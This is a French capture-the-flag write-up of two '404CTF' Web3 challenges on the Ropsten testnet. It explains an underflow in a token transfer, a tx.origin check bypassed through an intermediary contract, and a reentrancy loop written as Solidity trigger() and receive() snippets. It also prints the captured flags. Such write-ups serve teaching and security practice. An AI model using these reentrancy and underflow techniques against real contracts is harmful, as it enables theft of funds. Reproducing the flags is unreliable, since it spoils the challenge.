# Web3 / La guerre des contrats
Points: 1000 / 1000
Difficulté: Facile / Difficile 

# Partie 1
Agent, nous avons découvert un smart contract de Hallebarde qui permet d'obtenir de l'argent gratuitement. Il sert également à s'authentifier en tant que nouveau membre de Hallebarde. Nous voulons que vous vous fassiez passer pour un de leurs membres. Nous avons récemment trouvé un endpoint qui semble leur servir de portail de connexion. Introduisez-vous dans leur système et récupérez toutes les informations sensibles que vous pourrez trouver.

Contrat à l'adresse : 0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6
Réseau de test Ropsten
Auteur : Soremo

## Observation 
Le contrat n'utilise pas de bibliothèque SafeMath et n'effectue pas de vérification supplémentaire lors d'un transfer de fonds.
```js
function transfer(address receiver, uint256 numTokens) public returns (bool) {
    require(balances[msg.sender] > 0);
    balances[msg.sender] -= numTokens;
    balances[receiver] += numTokens;
    return true;
}    

## Exploitation
```
Il est donc possible dès qu'on a des fonds d'en envoyer autant que l'on souhaite à un autre compte.
On remarque aussi une subtilité sur la fonction `enterHallebarde()`:
```js
function enterHallebarde() public {
    require(balances[msg.sender] > 100 ether || boss == msg.sender, "Vous n'avez pas assez d'argent pour devenir membre de Hallebarde.");
    require(msg.sender != tx.origin || boss == msg.sender, "Soyez plus entreprenant !");
    require(!isHallebardeMember[msg.sender]);
    isHallebardeMember[msg.sender] = true;
}
```
On doit trouver un moyen d'avoir un tx.origin différent de notre msg.sender, c'est simple à faire, il faut passer par un contrat qui appeler la fonction `enterHallebarde()` tout en ayant assez de fonds d'abord.

On obtient ensuite le flag depuis le serveur `404CTF{5M4r7_C0N7r4C7_1NC3P710N_37_UND3rF10W_QU01_D3_P1U5_F4C113}`.

# Partie 2
Agent, maintenant que vous avez des compétences un peu plus approfondies en web3, nous aimerions faire appel à vos compétences dans une situation plus délicate. Nous avons décelé des traces d'activités suspectes à l'adresse 0xD5c0873f147cECF336fEEF1a28474716C745Df86. Hallebarde essaye apparemment de créer sa propre cryptomonnaie. De plus, il semble que les plus anciens membres de Hallebarde puissent récupérer une sorte de pass VIP. Utilisez ce pass pour obtenir des informations seulement connues par l'élite de Hallebarde.

Contrat à l'adresse : 0xD5c0873f147cECF336fEEF1a28474716C745Df86
Réseau de test Ropsten
Auteur : Soremo

`nc challenge.404ctf.fr 30885`

## Analyse du token
On repère la fonction qui nous intéresse, c'est la fonction senior qui vérifie à première vue l'âge de notre compte pour déterminer si l'on est VIP ou pas.
J'ai d'abord tenter de lire directement la valeur de vipPass depuis la blockchain (ce qui est possible) mais il est nécessaire de prouver que notre adresse remplit les conditions pour valider l'épreuve. On doit donc réussir à avoir un compte assez vieux !
```js
function senior() external view returns (uint256) {
    require(seniority[msg.sender] >= 10 * 365 days, "Revenez dans quelque temps.");
    require(seniority[msg.sender] < 150 * 365 days, "Vous vous faites vieux, laissez-nous la place.");
    return vipPass;
}
```
On remarque que la vente de HLB augmente de 365 jours l'âge de notre compte. Cette opération est effectuée avant de mettre à jour la condition bloquante de cette fonction `require(block.timestamp >= lastWithdrawTime[msg.sender] + 365 days)`, ce qui veut dire que l'on peut utiliser une attaque de réentrée en utilisant la fonction `receive()` d'un contrat et en appelant à nouveau la fonction de vente depuis ce dernier.
```js
function sellHLB(uint256 numTokens) public {
    require(balances[msg.sender] >= numTokens);
    require(block.timestamp >= lastWithdrawTime[msg.sender] + 365 days, "Vous devez attendre un an entre chaque retrait.");

    transfer(address(this), numTokens);
    seniority[msg.sender] = seniority[msg.sender].add(365 days);
    (bool sent, ) = msg.sender.call{value: numTokens}("");
    require(sent, "Erreur lors de l'envoi de l'ethereum.");
    lastWithdrawTime[msg.sender] = block.timestamp;
}
```

## Implémentation de l'attaque
En décléchant la vente de HLB (préalablement acheté en assez grande quantité), le contrat du token va verser les fonds à notre contrat déclenchant un nouveau call à `sellHLB(1)` jusqu'à ce que notre compte accumule assez de vente pour être considéré VIP.

```js
function trigger() onlyOwner public {
    _contract.sellHLB(1);
}

receive() external payable {
    if(count <= 10){
        count += 1;
        _contract.sellHLB(1);
    }
}
```

Retour sur le serveur pour valider notre addresse et code VIP et on obtient le flag `404CTF{135_5M4r7_C0N7r4C75_54V3N7_4U551_J0U3r_4U_P1N6_P0N6}`.